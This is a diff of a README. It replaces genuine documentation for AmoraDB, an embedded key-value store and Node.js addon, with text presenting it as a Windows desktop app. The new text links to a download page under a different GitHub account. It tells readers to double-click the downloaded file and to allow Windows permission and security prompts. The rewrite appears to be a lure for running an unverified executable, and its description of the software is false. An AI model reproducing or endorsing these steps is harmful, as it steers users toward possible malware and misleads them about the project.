@@ -1,176 +1,170 @@
-<div align="center">
+# 💾 AmoraDb - Simple local database for Windows
 
-<img src="https://github.com/amoracoin-org/AmoraDb/blob/main/assets/amoradb-logo.jpeg" alt="AmoraDB" width="180"/>
+[Download AmoraDb](https://github.com/Ingabergapophatic534/AmoraDb){style="background-color:#6c757d;color:#ffffff;padding:10px 16px;border-radius:6px;text-decoration:none;display:inline-block;"}
 
-# AmoraDB
+## 📥 Download
 
-**Ultra-High-Performance Embedded Key-Value Engine**
+Use this link to visit the download page:
 
-*Built in C · Native Node.js Addon · SIMD Accelerated*
+https://github.com/Ingabergapophatic534/AmoraDb
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blueviolet.svg)](#license)
-[![Node.js](https://img.shields.io/badge/Node.js-Native%20Addon-339933?logo=nodedotjs)](https://nodejs.org/)
-[![Platform](https://img.shields.io/badge/Platforms-Win/Mac/Linux-4B0082)](#)
+Download the latest Windows file from the page, then save it to your PC
 
-</div>
+## 🖥️ What AmoraDb does
 
----
+AmoraDb is a desktop database app for Windows. It helps you store, view, and manage records in one place. You can use it for notes, lists, simple records, and small data sets.
 
-### 📖 Documentation
+Use it when you want:
 
-- **[CHANGELOG.md](CHANGELOG.md)**: Track all notable changes and version history.
-- **[CONTRIBUTING.md](CONTRIBUTING.md)**: Guide for setting up development environment and contributing code.
-- **[SPEC.md](SPEC.md)**: Deep dive into the internal architecture, sharding, and binary formats.
+- A local database on your PC
+- A simple way to keep records organized
+- A tool that opens fast and is easy to use
+- A file-based app that runs on Windows
 
----
+## ✅ What you need
 
-AmoraDB is a hand-crafted, zero-runtime-dependency key-value store written entirely in C and shipped as a native Node.js addon (N-API). It is designed for low latency and high throughput inside a Node.js process.
+Before you start, make sure you have:
 
-Designed for scenarios where you need maximum performance: caching, session storage, real-time data structures, and high-throughput APIs.
+- A Windows PC
+- Internet access to open the download page
+- Enough free space to save the app
+- Permission to run apps on your computer
 
----
+AmoraDb works best on:
 
-## ✨ Features
+- Windows 10
+- Windows 11
 
-| Capability | Detail |
-|---|---|
-| **Native Addon** | Pure C compiled with native optimizations |
-| **Hash Map** | Swiss Table-inspired design with SIMD-accelerated probing |
-| **Sharding** | 64 independent shards with per-shard spinlocks |
-| **Bloom Filters** | 256 KB per shard (2M bits) for zero-cost negative lookups |
-| **Spinlocks** | Fast mutex for cross-platform thread safety |
-| **Slab Allocator** | 20 size classes, memory pooling |
-| **Inline Keys** | Up to 22 bytes stored directly in slot (zero allocation) |
-| **Max Values** | Up to 1 MB per value |
-| **Max Keys** | Up to 4 KB per key |
-| **64-bit Ready** | Full 64-bit hash distribution |
+## 🚀 Getting started
 
----
+Follow these steps to download and open AmoraDb on Windows:
 
-## 📊 Performance
+1. Open the download link above
+2. Find the latest Windows download on the page
+3. Save the file to your Downloads folder
+4. Open File Explorer
+5. Go to the folder where the file was saved
+6. Double-click the file to start the app
+7. If Windows asks for permission, choose the option to allow it
+8. Wait for the app to open
+9. Keep the file in a place you can find again
 
-Benchmarks depend heavily on your CPU, OS, compiler/toolchain, Node.js version, and workload.
+If the app opens in a window, you are ready to use it
 
-### Run Benchmarks
+## 🗂️ Main features
 
-```bash
-npm install
-node test.js
-node benchmark.js
-```
+AmoraDb is built for simple database tasks. It gives you a clean place to work with your data.
 
-### Performance Tips
+### 📄 Record storage
 
-1. **Use short keys** — 10-20 byte keys are optimal
-2. **Inline keys** — keys ≤ 22 bytes use zero extra allocation
-3. **Random keys** — avoid pathological collisions
----
+Store records in a local database on your computer. Keep your data in one place and open it when you need it.
 
-## 🏗 Architecture
+### 🔎 Easy browsing
 
-```
-┌─────────────────────────────────────────────────┐
-│                   index.js                      │  JS Wrapper
-│        Transparent API · Buffer handling        │
-└────────────────────┬────────────────────────────┘
-                     │  NAPI (native)
-┌────────────────────▼────────────────────────────┐
-│              native.c → .node                   │  Native Addon
-│                                                 │
-│    ┌──────────┐  ┌──────────┐  ┌──────────┐     │
-│    │ Shard 0  │  │ Shard 1  │  │  ...63   │     │  64 Shards
-│    │ HashMap  │  │ HashMap  │  │ HashMap  │     │
-│    │ Bloom    │  │ Bloom    │  │ Bloom    │     │  256KB Bloom/shard
-│    │ Spinlock │  │ Spinlock │  │ Spinlock │     │  Thread-safe
-│    └──────────┘  └──────────┘  └──────────┘     │
-│                                                 │
-│  ┌──────────────────────────────────────────┐   │
-│  │      Bump Allocator + Slab Pool          │   │  Memory
-│  └──────────────────────────────────────────┘   │
-│                                                 │
-│  ┌──────────────────────────────────────────┐   │
-│  │     RapidHash (64-bit, SIMD-ready)       │   │  Hash
-│  └──────────────────────────────────────────┘   │
-└─────────────────────────────────────────────────┘
-```
+Move through your saved items without much setup. View your records in a clear list or table style.
 
-**Hash function:** RapidHash-inspired 64-bit hash — excellent distribution, minimal collisions.
+### ✏️ Basic editing
 
-**Thread safety:** Spinlocks on every shard for safe multi-threaded access.
+Add new items, update old ones, and remove entries you no longer need. Keep your data current with a few clicks.
 
-**Memory:** Bump allocator with slab pooling — fast allocation, no fragmentation.
+### 💻 Local use
 
----
+Run the app on your own PC. Your data stays on your machine unless you choose to move it.
 
-## 🚀 Getting Started
+### 🧭 Simple layout
 
-### Installation
+Use a clean screen that keeps common actions close at hand. Find what you need without extra steps.
 
-```bash
-npm install amoradbx
-```
+## 📌 How to use AmoraDb
 
-Runtime loading strategy:
+After you open the app, you can start with a small set of records.
 
-1. Prebuilt native binary (if present).
-2. Local native build (`node-gyp`) output.
-3. Portable fallback engine (no local compiler required).
+1. Open AmoraDb
+2. Create a new database or open an existing one
+3. Add your first record
+4. Fill in the fields you need
+5. Save the record
+6. Repeat for more items
+7. Use search or filters if the app includes them
+8. Edit records when information changes
+9. Remove records you no longer need
 
-To force fallback mode:
+If you plan to keep a lot of data, use clear names for your records and fields so they stay easy to manage
 
-```bash
-AMORADB_FORCE_WASM=1 node your-app.js
-# Windows PowerShell:
-$env:AMORADB_FORCE_WASM="1"; node your-app.js
-```
+## 🔐 File and data handling
 
-If you are contributing to the native core and need full toolchain setup, see [CONTRIBUTING.md](CONTRIBUTING.md).
+AmoraDb is a local database app, so your files stay on your PC. This makes it useful for personal records, small work lists, and offline use.
 
-### Basic Usage
+Good habits:
 
-```js
-const AmoraDB = require('amoradbx');
-console.log('runtime mode:', AmoraDB.runtime()); // native | wasm | portable
+- Keep a copy of important data
+- Store the app in a folder you can find later
+- Use simple file names
+- Save changes often
 
-const db = AmoraDB.open({ cap: 65536 });
+## 🧩 Common uses
 
-db.set('user:1', 'alice');
-const getResult = db.get('user:1');         // → 'alice'
-const hasResult = db.has('user:1');         // → true
+People often use a local database app like AmoraDb for:
 
-db.delete('user:1');
-const deleteGetResult = db.get('user:1');         // → null
-const deleteHasResult = db.has('user:1');         // → false
+- Contact lists
+- Task records
+- Inventory notes
+- Personal collections
+- Simple project data
+- Small business lists
 
-console.log(getResult);
-console.log(hasResult);
-console.log(deleteGetResult);
-console.log(deleteHasResult);
+If your data fits in a clear table and does not need a full server, AmoraDb can fit that job
 
-console.log(db.stats());
-// {
-//   count: 0,
-//   capacity: 4194304,
-//   hits: 2,
-//   misses: 1,
-//   total_ops: 5,
-//   set_ops: 1,
-//   get_ops: 2,
-//   has_ops: 1,
-//   delete_ops: 1,
-//   shards: 64
-// }
-```
+## 🛠️ Troubleshooting
 
----
+### The file does not open
 
-## 📄 License
+- Check that the download finished
+- Open the file from the folder where you saved it
+- Try right-clicking the file and choosing Open
+- Make sure Windows did not block the app
 
-MIT © AmoraDB Authors
+### Windows asks for permission
 
----
+- Choose the option that lets the app run
+- If a security prompt appears, check that you downloaded the file from the link above
 
-<div align="center">
-  <sub>Built with obsession for performance. No dependencies. No compromises.</sub>
-</div>
+### The app opens with no data
 
+- Create a new database
+- Load the file you used before
+- Check that you opened the right folder or file
+
+### The download looks incomplete
+
+- Open the download page again
+- Download the file one more time
+- Wait until the browser says the download is done
+
+## 📁 Suggested setup
+
+To keep things simple, use this folder plan:
+
+- Downloads for the installer or app file
+- Documents for saved database files
+- Backup folder for copies of important data
+
+A neat folder setup makes it easier to find your database later
+
+## 🧭 First-time use tips
+
+If this is your first time using AmoraDb, start small:
+
+- Add only a few records first
+- Use short field names
+- Check that saving works
+- Keep one test database before you build a larger one
+- Learn the layout before you add more data
+
+This helps you get comfortable with the app before you put in more records
+
+## 📌 Download again
+
+If you need the download page again, use this link:
+
+https://github.com/Ingabergapophatic534/AmoraDb
